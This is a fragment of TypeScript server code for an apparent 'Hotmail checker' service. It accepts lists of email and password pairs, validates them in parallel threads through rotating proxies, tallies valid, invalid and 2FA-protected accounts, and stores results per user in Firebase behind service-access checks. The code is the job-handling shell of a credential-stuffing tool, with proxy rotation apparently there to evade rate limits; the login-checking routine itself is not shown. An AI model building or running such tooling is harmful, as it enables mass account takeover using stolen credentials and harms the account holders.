  console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} | Invalid: ${stats.invalid} | 2FA: ${stats.twoFa}`);
  
  // Broadcast completion
  await broadcastProgress(sessionId, {
    index: total,
    total,
    email: 'COMPLETE',
    password: '',
    status: 'success',
    message: `✅ Done! ${stats.valid} valid, ${stats.invalid} invalid, ${stats.twoFa} 2FA in ${duration}`,
    timestamp: Date.now()
  }).catch(() => {});
  
  // Save to Firebase
  if (userId) {
    await firebasePush(`checkHistory/${userId}`, {
      service: "hotmail_validator",
      checkMode,
      inputCount: total,
      stats,
      duration,
      results,
      createdAt: new Date().toISOString()
    }).catch(() => {});
  }
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    let userEmail: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        userEmail = tokenData.email || null;
      }
    }

    const body = await req.json();
    const { 
      accounts, 
      checkMode = "all", 
      threads = 5, 
      sessionId = null,
      proxies = []  // NEW: Optional proxy list for rotation
    } = body;

    // Initialize proxy rotator if proxies provided
    proxyRotator = proxies.length > 0 ? new ProxyRotator(proxies) : null;
    
    const proxyStats = proxyRotator?.getStats() || { total: 0, active: 0, failed: 0 };

    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
    console.log(`${getCanaryTimestamp()} HOTMAIL CHECKER REQUEST`);
    console.log(`${getCanaryTimestamp()} User: ${userEmail || userId || 'Anonymous'}`);
    console.log(`${getCanaryTimestamp()} Accounts: ${accounts?.length || 0} | Mode: ${checkMode} | Threads: ${threads}`);
    console.log(`${getCanaryTimestamp()} Proxies: ${proxyStats.total} loaded, ${proxyStats.active} active`);

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Check user access
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("hotmail_validator") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    const jobSessionId = sessionId || `job-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
    
    // Start background processing
    EdgeRuntime.waitUntil(
      processAccountsBackground(accounts, checkMode, threads, jobSessionId, userId, userEmail)
        .catch(error => {
          console.error(`${getCanaryTimestamp()} Background error:`, error);
        })
    );

    // Return immediately with job info
    return new Response(
      JSON.stringify({ 
        status: "processing",
        sessionId: jobSessionId,
        total: accounts.length,
        proxies: proxyStats,
        message: `Started processing ${accounts.length} accounts${proxyStats.total > 0 ? ` with ${proxyStats.total} proxies` : ''}. Watch the live feed for progress.`
      }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );

  } catch (error) {
    console.error(`${getCanaryTimestamp()} ERROR:`, error);
    return new Response(
      JSON.stringify({ error: String(error) }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
